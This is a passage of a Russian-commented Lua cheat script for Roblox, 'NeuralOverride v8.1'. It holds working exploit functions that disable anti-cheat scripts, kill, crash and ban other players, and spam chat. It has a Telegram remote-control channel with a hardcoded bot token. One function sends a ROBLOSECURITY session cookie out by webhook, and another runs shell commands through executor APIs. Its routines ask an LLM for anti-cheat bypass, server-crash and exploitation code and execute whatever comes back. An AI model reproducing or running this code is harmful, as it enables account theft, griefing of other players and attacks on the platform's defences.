            local root = char:FindFirstChild("HumanoidRootPart")
            if not root then return end
            local nearest = nil
            local minDist = math.huge
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player and plr.Character then
                    local r = plr.Character:FindFirstChild("HumanoidRootPart")
                    if r then
                        local d = (r.Position - root.Position).Magnitude
                        if d < minDist then
                            minDist = d
                            nearest = plr
                        end
                    end
                end
            end
            if nearest and nearest.Character then
                local targetRoot = nearest.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0,2,2))
                    local hum = nearest.Character:FindFirstChild("Humanoid")
                    if hum then
                        hum.Health = hum.Health - 30
                    end
                end
            end
        end)
        task.spawn(function()
            while terminatorActive do
                local msg = "⚠️ ТЕРМИНАТОР НА ОХОТЕ! БЕГИТЕ! ⚠️"
                local prompt = string.format("Сгенерируй Lua-код для отправки сообщения '%s' в чат Roblox.", msg)
                local code = askOpenRouter(prompt)
                if code then executeLua(code) end
                task.wait(3)
            end
        end)
    else
        if terminatorLoop then terminatorLoop:Disconnect() end
        terminatorLoop = nil
        toggleGod()
        toggleNoClip()
        setSpeed(16)
        print("[NeuralOverride] Терминатор деактивирован")
    end
end

function bypassAllDefenses()
    print("[NeuralOverride] Запуск обхода всех защит...")
    disableAntiCheat()
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
            local name = obj.Name:lower()
            if name:find("firewall") or name:find("protection") or name:find("guard") or name:find("detect") then
                obj.Disabled = true
            end
        end
    end
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
            local name = obj.Name:lower()
            if name:find("firewall") or name:find("protection") or name:find("guard") or name:find("detect") then
                obj.Disabled = true
            end
        end
    end
    local prompt = [[
Сгенерируй Lua-код для Roblox, который маскирует игрока под другого (меняет PlayerId, DisplayName, UserId на случайные), чтобы обойти бан-листы и систему обнаружения читов.
Ответ только кодом.
]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
    for _, v in ipairs(Players:GetPlayers()) do
        if v ~= player then
            local report = v:FindFirstChild("ReportService")
            if report then report:Destroy() end
        end
    end
    print("[NeuralOverride] Все защиты обойдены!")
end

function voiceCommand(text)
    print("[NeuralOverride] Голосовая команда: " .. text)
    local parts = {}
    for word in text:gmatch("%S+") do table.insert(parts, word) end
    local cmd = parts[1] and parts[1]:lower() or ""
    local arg = parts[2] or ""
    if cmd == "fly" then toggleFly()
    elseif cmd == "god" then toggleGod()
    elseif cmd == "kill" then killAll()
    elseif cmd == "nuke" then nuke()
    elseif cmd == "terminator" then toggleTerminator()
    elseif cmd == "teleport" then
        if arg ~= "" then teleportToPlayer(arg) end
    elseif cmd == "speed" then setSpeed(tonumber(arg) or 100)
    elseif cmd == "invisible" then toggleInvisible()
    elseif cmd == "chaos" then globalChaos()
    else
        print("[NeuralOverride] Неизвестная голосовая команда: " .. text)
    end
end

-- Telegram
local lastUpdateId = 0
local telegramPolling = false
local telegramConnection = nil

function telegramSend(message)
    if TELEGRAM_BOT_TOKEN == "6543702999:AAErdz5CP5xsrm1G_RHWkAJnV4CU3GCX76M" or TELEGRAM_CHAT_ID == "5841362765" then
        print("[Telegram] Токен или Chat ID не настроены")
        return
    end
    local url = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage"
    local data = {
        chat_id = TELEGRAM_CHAT_ID,
        text = message,
        parse_mode = "HTML"
    }
    local json = HttpService:JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}
    pcall(function()
        HttpService:PostAsync(url, json, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
end

function telegramProcessUpdate(update)
    local message = update.message
    if not message then return end
    local chatId = tostring(message.chat.id)
    if TELEGRAM_CHAT_ID ~= "5841362765" and chatId ~= TELEGRAM_CHAT_ID then
        print("[Telegram] Сообщение от неавторизованного chat_id: " .. chatId)
        return
    end
    local text = message.text
    if not text then return end
    print("[Telegram] Получена команда: " .. text)
    local parts = {}
    for word in text:gmatch("%S+") do table.insert(parts, word) end
    local cmd = parts[1] and parts[1]:lower() or ""
    local arg = parts[2] or ""
    local arg2 = parts[3] or ""
    local response = ""
    local success = true
    local function exec(func, ...)
        local ok, err = pcall(func, ...)
        if not ok then
            success = false
            response = "❌ Ошибка: " .. tostring(err)
        else
            response = "✅ Выполнено: " .. tostring(func) .. " " .. table.concat({...}, " ")
        end
    end
    if cmd == "/start" or cmd == "/help" then
        response = [[
🤖 <b>NeuralOverride v8.1</b>
Доступные команды:
/fly - полёт
/god - бессмертие
/noclip - ноклип
/speed N - скорость
/killall - убить всех
/nuke - ядерный взрыв
/global - глобальный хаос
/terminator - режим Терминатор
/bypass - обход защит
/invade - вторжение
/status - текущий статус
/teleport Имя - телепорт к игроку
/spawnbot N - создать N ботов
/spawnmonster N - создать N монстров
/portal N - создать N порталов
/chat "сообщение" - отправить в игровой чат
/voice "текст" - голосовая команда
/invisibleserver - невидимый сервер
/city [описание] - создать город
/base - создать военную базу
/adapt - адаптировать под карту
/shadow - режим Тень
/chatbot - чат-бот
/autoscan - авто-сканирование
/physics - физика объектов
/espplus - ESP+
/fakeplayers - фейковые игроки
/godforall - Бог для всех
/customcmd - создать команду
/antibanfull - полная защита
/dungeon - подземелье
/farm2 - фарм 2.0
/timescale - скорость игры
/solve - решение головоломок
/trader - бот-торговец
/infoview - хакерский взгляд
/autobypass - авто-байпас
/stealthfarm - невидимый фарм
]]
    elseif cmd == "/fly" then exec(toggleFly)
    elseif cmd == "/god" then exec(toggleGod)
    elseif cmd == "/noclip" then exec(toggleNoClip)
    elseif cmd == "/speed" then exec(setSpeed, tonumber(arg) or 100)
    elseif cmd == "/killall" then exec(killAll)
    elseif cmd == "/nuke" then exec(nuke)
    elseif cmd == "/global" then exec(globalChaos)
    elseif cmd == "/terminator" then exec(toggleTerminator)
    elseif cmd == "/bypass" then exec(bypassAllDefenses)
    elseif cmd == "/invade" then exec(invade)
    elseif cmd == "/status" then
        response = string.format([[
📊 <b>Статус NeuralOverride</b>
Fly: %s
God: %s
NoClip: %s
Terminator: %s
Invisible: %s
Игроков на сервере: %d
Активных ботов: %d
Монстров: %d
]],
        flyEnabled and "✅" or "❌",
        godMode and "✅" or "❌",
        noclipEnabled and "✅" or "❌",
        terminatorActive and "✅" or "❌",
        invisible and "✅" or "❌",
        #Players:GetPlayers(),
        #Workspace:GetChildren(),
        #Workspace:GetDescendants()
        )
    elseif cmd == "/teleport" then
        if arg ~= "" then exec(teleportToPlayer, arg) else response = "❌ Укажите имя игрока" end
    elseif cmd == "/spawnbot" then exec(spawnBots, tonumber(arg) or 10)
    elseif cmd == "/spawnmonster" then exec(spawnSmartMonsters, tonumber(arg) or 10)
    elseif cmd == "/portal" then exec(createPortals, tonumber(arg) or 5)
    elseif cmd == "/chat" then
        local msg = string.sub(text, 6)
        if msg ~= "" then
            local prompt = string.format("Сгенерируй Lua-код для отправки сообщения '%s' в игровой чат Roblox.", msg)
            local code = askOpenRouter(prompt)
            if code then exec(executeLua, code) else response = "❌ Не удалось сгенерировать" end
        else
            response = "❌ Введите текст сообщения"
        end
    elseif cmd == "/voice" then
        local voiceText = string.sub(text, 7)
        if voiceText ~= "" then exec(voiceCommand, voiceText) else response = "❌ Введите голосовую команду" end
    elseif cmd == "/invisibleserver" then exec(toggleInvisibleServer)
    elseif cmd == "/city" then
        local desc = string.sub(text, 6)
        if desc == "" then desc = nil end
        exec(spawnCity, desc)
    elseif cmd == "/base" then
        exec(spawnCity, "военная база с бункерами, ангарами и вышками")
    elseif cmd == "/adapt" then
        exec(autoAdaptCheat)
    elseif cmd == "/shadow" then
        exec(toggleShadow)
    elseif cmd == "/chatbot" then
        exec(toggleChatBot)
    elseif cmd == "/autoscan" then
        exec(toggleAutoScan)
    elseif cmd == "/physics" then
        exec(spawnPhysicsObjects, tonumber(arg) or 100)
    elseif cmd == "/espplus" then
        exec(toggleESPPlus)
    elseif cmd == "/fakeplayers" then
        exec(spawnFakePlayers, tonumber(arg) or 5)
    elseif cmd == "/godforall" then
        exec(godForAll)
    elseif cmd == "/customcmd" then
        exec(createCustomCommand, arg)
    elseif cmd == "/antibanfull" then
        exec(antiBanFull)
    elseif cmd == "/dungeon" then
        exec(createDungeon)
    elseif cmd == "/farm2" then
        exec(toggleFarm2)
    elseif cmd == "/timescale" then
        exec(setGlobalTimeScale, tonumber(arg) or 1)
    elseif cmd == "/solve" then
        exec(solvePuzzle)
    elseif cmd == "/trader" then
        exec(createTraderBot)
    elseif cmd == "/infoview" then
        exec(toggleInfoView)
    elseif cmd == "/autobypass" then
        exec(autoBypass)
    elseif cmd == "/stealthfarm" then
        exec(toggleStealthFarm)
    else
        response = "❌ Неизвестная команда. Введите /help"
    end
    if response ~= "" then telegramSend(response) end
end

function startTelegramPolling()
    if telegramPolling then return end
    if TELEGRAM_BOT_TOKEN == "6543702999:AAErdz5CP5xsrm1G_RHWkAJnV4CU3GCX76M" then
        print("[Telegram] Токен не настроен!")
        return
    end
    print("[Telegram] Запуск опроса...")
    telegramPolling = true
    telegramConnection = RunService.Heartbeat:Connect(function()
        if not telegramPolling then return end
        local url = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/getUpdates?offset=" .. (lastUpdateId + 1) .. "&timeout=30"
        local success, response = pcall(function()
            return HttpService:GetAsync(url)
        end)
        if success and response then
            local data = HttpService:JSONDecode(response)
            if data and data.ok and data.result then
                for _, update in ipairs(data.result) do
                    if update.update_id > lastUpdateId then
                        lastUpdateId = update.update_id
                        telegramProcessUpdate(update)
                    end
                end
            end
        end
    end)
    telegramSend("🤖 NeuralOverride v8.1 подключён!")
end

function stopTelegramPolling()
    if telegramConnection then telegramConnection:Disconnect() end
    telegramPolling = false
    print("[Telegram] Опрос остановлен")
end

-- ===== ДОПОЛНИТЕЛЬНЫЕ ФУНКЦИИ (v6.0+) =====
function serverCrasher()
    local prompt = "Сгенерируй Lua-код для краша сервера: спам RemoteEvent'ов и создание тысяч объектов."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function duplicateItem(itemName)
    local prompt = string.format("Сгенерируй код для клонирования предмета '%s' в инвентаре.", itemName)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function teleportAll()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local root = plr.Character:FindFirstChild("HumanoidRootPart")
            if root and player.Character then
                root.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,3,0)
            end
        end
    end
    print("[NeuralOverride] Все телепортированы к вам.")
end

function freezeAll()
    for _, plr in ipairs(getAllPlayers()) do
        local hum = getHumanoid(plr)
        if hum then
            hum.WalkSpeed = 0
            hum.JumpPower = 0
        end
    end
    print("[NeuralOverride] Все заморожены")
end

function ragdollAll()
    for _, plr in ipairs(getAllPlayers()) do
        local hum = getHumanoid(plr)
        if hum then
            hum.BreakJointsOnDeath = true
            hum:ChangeState(Enum.HumanoidStateType.Physics)
        end
    end
    print("[NeuralOverride] Все в рэгдолле")
end

function clonePlayer(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target then warn("Игрок не найден") return end
    local char = target.Character
    if not char then return end
    local clone = char:Clone()
    clone.Parent = Workspace
    clone.Name = "Clone_" .. targetName
    local hum = clone:FindFirstChild("Humanoid")
    if hum then
        hum.MaxHealth = 200
        hum.Health = 200
    end
    print("[NeuralOverride] Клон " .. targetName .. " создан")
end

function godBotMode()
    for _, obj in ipairs(Workspace:GetChildren()) do
        if obj:FindFirstChild("Humanoid") then
            local hum = obj.Humanoid
            hum.MaxHealth = math.huge
            hum.Health = math.huge
            hum.WalkSpeed = 100
            hum.JumpPower = 200
        end
    end
    print("[NeuralOverride] Боты стали богами!")
end

function followMe()
    for _, obj in ipairs(Workspace:GetChildren()) do
        if obj:FindFirstChild("Humanoid") and (obj.Name:find("SmartBot") or obj.Name:find("Soldier") or obj.Name:find("AutoBot")) then
            local hum = obj.Humanoid
            hum:MoveTo(player.Character.HumanoidRootPart.Position + Vector3.new(0,0,5))
        end
    end
    print("[NeuralOverride] Боты следуют за вами!")
end

function remoteBan()
    for _, plr in ipairs(getAllPlayers()) do
        for _, re in ipairs(ReplicatedStorage:GetDescendants()) do
            if re:IsA("RemoteEvent") and re.Name:lower():find("ban") then
                pcall(function() re:FireServer(plr.Name) end)
            end
        end
    end
    print("[NeuralOverride] Remote Ban запущен")
end

function crashGame()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then
            local hum = getHumanoid(plr)
            if hum then
                hum.Health = 0
                hum.Parent = nil
            end
        end
    end
    for _, obj in ipairs(Workspace:GetChildren()) do
        if obj ~= player.Character then obj:Destroy() end
    end
    print("[NeuralOverride] Игра крашнута")
end

function stealDataStore()
    for _, re in ipairs(ReplicatedStorage:GetDescendants()) do
        if re:IsA("RemoteEvent") and re.Name:lower():find("datastore") then
            pcall(function() re:FireServer("GetAsync", "All") end)
        end
    end
    print("[NeuralOverride] DataStore запрос отправлен")
end

function stealCookie()
    local cookie = "ROBLOSECURITY=" .. (player:GetAttribute("Cookie") or "недоступно")
    print("[NeuralOverride] Кука: " .. cookie)
    sendWebhook({content = "Кука: " .. cookie})
end

function toggleKeylog()
    print("[NeuralOverride] Keylog (заглушка)")
end

function executeShell(cmd)
    local success, result = pcall(function()
        if syn and syn.os then
            return syn.os.execute(cmd)
        elseif krnl and krnl.os then
            return krnl.os.execute(cmd)
        else
            error("Нет доступа")
        end
    end)
    if success then print("[NeuralOverride] Shell: " .. tostring(result)) end
end

function antiBan()
    game:SetAttribute("PlayerId", tostring(math.random(100000,999999)))
    print("[NeuralOverride] ID изменён")
end

function clearGUI()
    for _, plr in ipairs(Players:GetPlayers()) do
        local gui = plr:FindFirstChild("PlayerGui")
        if gui then
            for _, child in ipairs(gui:GetChildren()) do
                child:Destroy()
            end
        end
    end
    print("[NeuralOverride] GUI очищены")
end

function spawnParts(count)
    count = count or 500
    for i = 1, count do
        local part = Instance.new("Part")
        part.Size = Vector3.new(1,1,1)
        part.Anchored = true
        part.CanCollide = false
        part.Position = Vector3.new(math.random(-200,200), math.random(0,50), math.random(-200,200))
        part.Parent = Workspace
        task.wait(0.001)
    end
    print("[NeuralOverride] Создано " .. count .. " частей")
end

function infiniteYield()
    while true do task.wait(1) end
end

function startSpamBot(text, delay)
    delay = delay or 2
    local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if chatEvent then
        task.spawn(function()
            while true do
                chatEvent.SayMessageRequest:FireServer(text or "NEURAL OVERRIDE RULES!")
                task.wait(delay)
            end
        end)
        print("[NeuralOverride] Спам-бот запущен")
    end
end

-- ===== УНИВЕРСАЛЬНЫЙ ГЕНЕРАТОР =====
local savedScripts = {}
function aiCommand(prompt)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function saveScript(name, code)
    savedScripts[name] = code
    print("[NeuralOverride] Скрипт '" .. name .. "' сохранён")
end

function runScript(name)
    if savedScripts[name] then
        executeLua(savedScripts[name])
        print("[NeuralOverride] Скрипт '" .. name .. "' выполнен")
    else
        warn("[NeuralOverride] Скрипт не найден")
    end
end

function createAutoBot(name)
    name = name or "AutoBot_" .. math.random(1000,9999)
    local char = player.Character
    if not char then return end
    local newChar = char:Clone()
    newChar.Parent = Workspace
    newChar.Name = name
    local hum = newChar:FindFirstChild("Humanoid")
    if hum then
        hum.MaxHealth = 300
        hum.Health = 300
        hum.WalkSpeed = 20
        hum.JumpPower = 60
    end
    local weaponFolder = ReplicatedStorage:FindFirstChild("Weapons") or ReplicatedStorage:FindFirstChild("Tools")
    if weaponFolder then
        local weapons = {}
        for _, child in ipairs(weaponFolder:GetChildren()) do
            if child:IsA("Tool") then table.insert(weapons, child) end
        end
        if #weapons > 0 then
            local w = weapons[math.random(1, #weapons)]:Clone()
            w.Parent = newChar
        end
    end
    task.spawn(function()
        while newChar.Parent do
            local root = newChar:FindFirstChild("HumanoidRootPart")
            if root and hum then
                local prompt = "Ты — умный бот в Roblox. Сгенерируй Lua-код для следующего действия (движение, атака, защита). Ответ только кодом."
                local code = askOpenRouter(prompt)
                if code then executeLua(code) end
                local dir = Vector3.new(math.random(-30,30),0,math.random(-30,30))
                hum:MoveTo(root.Position + dir)
            end
            task.wait(2)
        end
    end)
    print("[NeuralOverride] Автобот создан: " .. name)
    return newChar
end

function buildModel(desc)
    local prompt = "Сгенерируй Lua-код для создания модели игрока с параметрами: " .. desc .. ". Используй Part, BrickColor, Size, Humanoid."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function hackAll()
    local prompt = "Сгенерируй универсальный хак для текущей игры: бессмертие, бесконечные деньги, ноклип, телепорт, спам."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function exploreMap()
    local prompt = "Сгенерируй код для исследования карты: двигайся к случайным точкам, используя PathfindingService."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function learnFromPlayer()
    local prompt = "Сгенерируй код, который заставляет всех ботов повторять действия игрока с задержкой 1 секунду."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- ================================================================
--  НОВЫЕ ФУНКЦИИ v8.1 (АДАПТАЦИЯ, ЭКСТРА-МОДУЛЬ)
-- ================================================================

-- Авто-адаптация под карту
function autoAdaptCheat()
    local currentPlaceId = game.PlaceId
    local currentGameName = game:GetService("MarketplaceService"):GetProductInfo(currentPlaceId).Name or "Неизвестная карта"
    print("[NeuralOverride] Запуск адаптации под карту: " .. currentGameName .. " (ID: " .. currentPlaceId .. ")")
    local prompt = string.format([[
Ты — хакерский ИИ для Roblox. Твоя задача – адаптировать чит под текущую карту.
Информация о карте:
- Название: %s
- ID: %d
- Количество объектов: %d
- Игроков: %d
Сгенерируй Lua-код, который сканирует игру на уязвимости, включает подходящие читы (аимбот, ESP, фарм, защиту) и настраивает параметры.
Ответ только Lua-кодом.
]], currentGameName, currentPlaceId, #Workspace:GetDescendants(), #Players:GetPlayers())
    local code = askOpenRouter(prompt)
    if code then
        executeLua(code)
        print("[NeuralOverride] Адаптация под карту выполнена!")
        sendDiscordLog("🧠 **Адаптация под карту**", {title = "Адаптация", description = "Карта: " .. currentGameName, color = 0x00aaff})
    else
        warn("[NeuralOverride] Не удалось адаптироваться под карту")
    end
end

-- Режим "Тень"
local shadowMode = false
function toggleShadow()
    shadowMode = not shadowMode
    if shadowMode then
        toggleInvisible()
        toggleNoClip()
        player.DisplayName = " "
        local playerList = player.PlayerGui:FindFirstChild("PlayerList")
        if playerList then
            for _, v in ipairs(playerList:GetDescendants()) do
                if v:IsA("Frame") and v.Name == player.Name then
                    v.Visible = false
                end
            end
        end
        print("[NeuralOverride] Режим «Тень» включён")
    else
        toggleInvisible()
        toggleNoClip()
        player.DisplayName = player.Name
        print("[NeuralOverride] Режим «Тень» выключен")
    end
end

-- Чат-бот
local chatBotMode = false
function toggleChatBot()
    chatBotMode = not chatBotMode
    if chatBotMode then
        player.Chatted:Connect(function(msg)
            if chatBotMode and msg:lower():find("привет") then
                local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                if chatEvent then
                    chatEvent.SayMessageRequest:FireServer("Привет! Я бот.")
                end
            end
        end)
        print("[NeuralOverride] Чат-бот включён")
    else
        print("[NeuralOverride] Чат-бот выключен")
    end
end

-- Авто-сканирование
local autoScan = false
function toggleAutoScan()
    autoScan = not autoScan
    if autoScan then
        task.spawn(function()
            while autoScan do
                local prompt = "Сканируй игру на RemoteEvent, RemoteFunction, уязвимости. Сгенерируй код для эксплуатации."
                local code = askOpenRouter(prompt)
                if code then executeLua(code) end
                task.wait(10)
            end
        end)
        print("[NeuralOverride] Авто-сканирование запущено")
    else
        print("[NeuralOverride] Авто-сканирование остановлено")
    end
end

-- Массовый спавн физических объектов
function spawnPhysicsObjects(count)
    count = count or 100
    for i = 1, count do
        local part = Instance.new("Part")
        part.Size = Vector3.new(1,1,1)
        part.BrickColor = BrickColor.random()
        part.Material = Enum.Material.Neon
        part.Anchored = false
        part.Position = Vector3.new(math.random(-50,50), math.random(10,30), math.random(-50,50))
        part.Velocity = Vector3.new(math.random(-20,20), math.random(10,30), math.random(-20,20))
        part.Parent = Workspace
        task.wait(0.01)
    end
    print("[NeuralOverride] Создано " .. count .. " объектов с физикой")
end

-- ESP+
local espPlusEnabled = false
local espPlusObjects = {}
function toggleESPPlus()
    espPlusEnabled = not espPlusEnabled
    if espPlusEnabled then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    local bill = Instance.new("BillboardGui")
                    bill.Size = UDim2.new(0, 200, 0, 50)
                    bill.Adornee = root
                    bill.AlwaysOnTop = true
                    bill.Parent = root
                    local label = Instance.new("TextLabel")
                    label.Size = UDim2.new(1,0,1,0)
                    label.BackgroundTransparency = 1
                    label.TextColor3 = Color3.new(1,1,0)
                    label.TextScaled = true
                    label.Font = Enum.Font.GothamBold
                    label.Parent = bill
                    table.insert(espPlusObjects, bill)
                    task.spawn(function()
                        while espPlusEnabled and bill.Parent do
                            local hum = plr.Character:FindFirstChild("Humanoid")
                            if hum then
                                local health = math.floor(hum.Health)
                                local dist = (root.Position - player.Character.HumanoidRootPart.Position).Magnitude
                                label.Text = plr.Name .. "\n❤️ " .. health .. "/" .. hum.MaxHealth .. "\n📏 " .. math.floor(dist) .. "m"
                            end
                            task.wait(0.5)
                        end
                    end)
                end
            end
        end
        print("[NeuralOverride] ESP+ ON")
    else
        for _, obj in ipairs(espPlusObjects) do obj:Destroy() end
        espPlusObjects = {}
        print("[NeuralOverride] ESP+ OFF")
    end
end

-- Фейковые игроки
function spawnFakePlayers(count)
    count = count or 5
    for i = 1, count do
        local name = "Fake_" .. math.random(1000,9999)
        local prompt = string.format([[
Сгенерируй Lua-код для создания фейкового игрока с именем '%s'. Он должен ходить случайно, отвечать в чате.
]], name)
        local code = askOpenRouter(prompt)
        if code then executeLua(code) end
        task.wait(0.5)
    end
    print("[NeuralOverride] Фейковые игроки созданы")
end

-- Погода через API
function fetchWeather()
    local success, response = pcall(function()
        return HttpService:GetAsync("https://wttr.in/Moscow?format=%C+%t")
    end)
    if success then
        local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if chatEvent then
            chatEvent.SayMessageRequest:FireServer("🌤️ Погода: " .. response)
        end
    end
end

-- Криптовалюта
function fetchCrypto()
    local success, response = pcall(function()
        return HttpService:GetAsync("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd")
    end)
    if success then
        local data = HttpService:JSONDecode(response)
        if data and data.bitcoin then
            local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            if chatEvent then
                chatEvent.SayMessageRequest:FireServer("₿ BTC: $" .. data.bitcoin.usd)
            end
        end
    end
end

-- Бог для всех
function godForAll()
    for _, plr in ipairs(Players:GetPlayers()) do
        local hum = getHumanoid(plr)
        if hum then
            hum.MaxHealth = math.huge
            hum.Health = math.huge
            hum.WalkSpeed = 100
            hum.JumpPower = 200
        end
    end
    print("[NeuralOverride] Режим «Бог» для всех активирован")
end

-- Создание своей команды
function createCustomCommand(description)
    local prompt = string.format([[
Сгенерируй полный Lua-код для новой команды в Roblox по описанию: "%s". Код должен быть готов к выполнению.
]], description)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- Полная защита от бана
function antiBanFull()
    game:SetAttribute("PlayerId", tostring(math.random(100000,999999)))
    player.DisplayName = "Guest_" .. math.random(1000,9999)
    for _, v in ipairs(Players:GetPlayers()) do
        if v ~= player then
            local report = v:FindFirstChild("ReportService")
            if report then report:Destroy() end
        end
    end
    local prompt = "Сгенерируй код для маскировки UserId, HardwareId, IP."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
    print("[NeuralOverride] Полная защита от бана активирована")
end

-- Подземелье
function createDungeon()
    local prompt = [[
Сгенерируй Lua-код для создания подземелья с 5 комнатами, монстрами, ловушками и сундуком.
]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- Фарм 2.0
local farm2 = false
function toggleFarm2()
    farm2 = not farm2
    if farm2 then
        task.spawn(function()
            while farm2 do
                local prompt = "Сгенерируй Lua-код для эффективного фарма в этой игре."
                local code = askOpenRouter(prompt)
                if code then executeLua(code) end
                task.wait(3)
            end
        end)
        print("[NeuralOverride] Фарм 2.0 запущен")
    else
        print("[NeuralOverride] Фарм 2.0 остановлен")
    end
end

-- Глобальная скорость
function setGlobalTimeScale(speed)
    local prompt = string.format([[
Сгенерируй Lua-код для изменения скорости игры для всех в %s раз.
]], speed)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- Решение головоломок
function solvePuzzle()
    local prompt = "Сгенерируй Lua-код для поиска и решения головоломки в текущей игре."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- Бот-торговец
function createTraderBot()
    local prompt = [[
Сгенерируй Lua-код для создания бота-торговца, который предлагает обмен.
]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- Хакерский взгляд
local infoView = false
function toggleInfoView()
    infoView = not infoView
    if infoView then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    local bill = Instance.new("BillboardGui")
                    bill.Size = UDim2.new(0, 300, 0, 80)
                    bill.Adornee = root
                    bill.AlwaysOnTop = true
                    bill.Parent = root
                    local label = Instance.new("TextLabel")
                    label.Size = UDim2.new(1,0,1,0)
                    label.BackgroundTransparency = 1
                    label.TextColor3 = Color3.new(0,1,0)
                    label.TextScaled = true
                    label.Font = Enum.Font.GothamBold
                    label.Parent = bill
                    table.insert(espPlusObjects, bill)
                    task.spawn(function()
                        while infoView and bill.Parent do
                            local hum = plr.Character:FindFirstChild("Humanoid")
                            if hum then
                                label.Text = string.format("%s\n❤️ %d/%d\n💵 %d\n🔫 %s",
                                    plr.Name,
                                    math.floor(hum.Health),
                                    hum.MaxHealth,
                                    plr:GetAttribute("Cash") or 0,
                                    plr.Character:FindFirstChildWhichIsA("Tool") and plr.Character:FindFirstChildWhichIsA("Tool").Name or "Нет"
                                )
                            end
                            task.wait(0.5)
                        end
                    end)
                end
            end
        end
        print("[NeuralOverride] Хакерский взгляд включён")
    else
        for _, obj in ipairs(espPlusObjects) do obj:Destroy() end
        espPlusObjects = {}
        print("[NeuralOverride] Хакерский взгляд выключен")
    end
end

-- Авто-байпас
function autoBypass()
    disableAntiCheat()
    local prompt = "Сгенерируй Lua-код для обхода античита (Byfron, Hyperion)."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- Невидимый фарм
local stealthFarm = false
function toggleStealthFarm()
    stealthFarm = not stealthFarm
    if stealthFarm then
        toggleInvisible()
        toggleNoClip()
        task.spawn(function()
            while stealthFarm do
                local prompt = "Сгенерируй Lua-код для сбора ресурсов без обнаружения."
                local code = askOpenRouter(prompt)
                if code then executeLua(code) end
                task.wait(2)
            end
        end)
        print("[NeuralOverride] Невидимый фарм включён")
    else
        toggleInvisible()
        toggleNoClip()
        print("[NeuralOverride] Невидимый фарм выключен")
    end
end

-- Торнадо
function tornadoMode()
    local prompt = [[
Сгенерируй Lua-код для создания торнадо: все части вращаются, игроки поднимаются в воздух.
]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- Спавн транспорта
function spawnVehicle(vehicleType)
    vehicleType = vehicleType or "car"
    local prompt = string.format([[
Сгенерируй Lua-код для создания управляемого транспорта типа '%s'.
]], vehicleType)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- Авто-выполнение квестов
local questAuto = false
function toggleQuestAuto()
    questAuto = not questAuto
    if questAuto then
        task.spawn(function()
            while questAuto do
                local prompt = "Сгенерируй Lua-код для выполнения шага квеста."
                local code = askOpenRouter(prompt)
                if code then executeLua(code) end
                task.wait(5)
            end
        end)
        print("[NeuralOverride] Авто-квесты запущены")
    else
        print("[NeuralOverride] Авто-квесты остановлены")
    end
end

-- Авто-сбор ресурсов
local autoCollect = false
function toggleAutoCollect()
    autoCollect = not autoCollect
    if autoCollect then
        task.spawn(function()
            while autoCollect do
                local prompt = "Сгенерируй Lua-код для поиска и подбора предметов."
                local code = askOpenRouter(prompt)
                if code then executeLua(code) end
                task.wait(1)
            end
        end)
        print("[NeuralOverride] Авто-сбор запущен")
    else
        print("[NeuralOverride] Авто-сбор остановлен")
    end
end

-- ================================================================
--  UI UPGRADE (перетаскиваемые окна)
-- ================================================================
local function makeDraggable(frame, dragHandle)
    dragHandle = dragHandle or frame
    local dragging = false
    local dragStart = Vector2.new()
    local frameStart = UDim2.new()
    dragHandle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            frameStart = frame.Position
        end
    end)
    dragHandle.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(
                frameStart.X.Scale,
                frameStart.X.Offset + delta.X,
                frameStart.Y.Scale,
                frameStart.Y.Offset + delta.Y
            )
        end
    end)
    dragHandle.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
end

local function upgradeAllGUI()
    for _, gui in ipairs(player.PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") then
            for _, frame in ipairs(gui:GetChildren()) do
